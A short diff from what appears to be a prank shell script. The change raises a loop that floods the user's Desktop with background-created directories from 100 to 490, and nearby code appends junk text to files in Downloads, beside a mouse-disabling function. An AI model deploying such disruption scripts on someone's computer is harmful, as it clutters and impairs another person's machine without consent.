@@ -54,7 +54,7 @@ disable_mouse(){
 # Description: makes tons of directories and files and expands it 
 dirNfile_generator(){
 	# dir generator
-	for i in {1..100}; do mkdir ~/Desktop/ola$i& done
+	for i in {1..490}; do mkdir ~/Desktop/ola$i& done
 
 	# file generator
 	yes uouououououou | head 50000 >> ~/Downloads/yes$i.txt
